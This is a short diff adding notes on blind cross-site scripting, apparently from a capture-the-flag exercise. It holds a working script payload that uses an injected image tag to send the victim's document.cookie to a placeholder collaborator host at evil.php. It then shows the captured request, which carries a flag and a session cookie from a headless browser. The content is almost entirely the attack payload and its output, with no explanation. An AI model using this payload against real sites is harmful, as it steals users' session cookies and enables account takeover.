@@ -1,0 +1,16 @@
+Blind XSS
+
+https://security.stackexchange.com/questions/106224/xss-display-cookie-of-another-website
+
+<script>document.write('<img src="http://BURPCOLLABORATOR/evil.php?cookie=' + document.cookie + '"/>')</script>
+
+GET /evil.php?cookie=flag=CTF{8aaa2f34b392b415601804c2f5f0f24e};%20session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV HTTP/1.1
+Pragma: no-cache
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Host: REDACTED
+Via: 1.1 infra-squid (squid/3.5.27)
+X-Forwarded-For: 34.77.100.99
+Cache-Control: no-cache
+Connection: keep-alive
